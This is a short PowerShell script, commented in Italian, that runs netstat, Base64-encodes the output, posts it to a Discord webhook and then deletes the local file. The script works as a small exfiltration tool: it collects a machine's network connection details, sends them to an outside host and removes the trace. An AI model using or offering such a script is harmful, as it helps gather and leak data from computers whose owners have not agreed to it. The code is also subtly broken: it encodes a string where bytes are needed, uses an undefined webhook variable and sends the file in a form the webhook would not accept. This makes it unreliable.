# Imposta il percorso del file in cui salvare l'output di netstat
$filePath = Join-Path $PSScriptRoot "netstat_output.txt"

# Esegue il comando netstat e salva l'output nel file specificato
netstat > $filePath

# Contenuto del messaggio Discord
$message = "Output di netstat:"

# Converti il contenuto del file in Base64
$fileContentBase64 = [Convert]::ToBase64String((Get-Content -Path $filePath -Raw -Encoding UTF8))

# Creazione dei dati da inviare al webhook
$data = @{
    content = $message
    file = @{
        name = "netstat_output.txt"
        content = $fileContentBase64
    }
} | ConvertTo-Json

# Invia il messaggio Discord tramite Invoke-RestMethod
Invoke-RestMethod -Uri $webhook -Method Post -Body $data -ContentType "application/json"

# Elimina il file dopo l'invio (se necessario)
Remove-Item $filePath
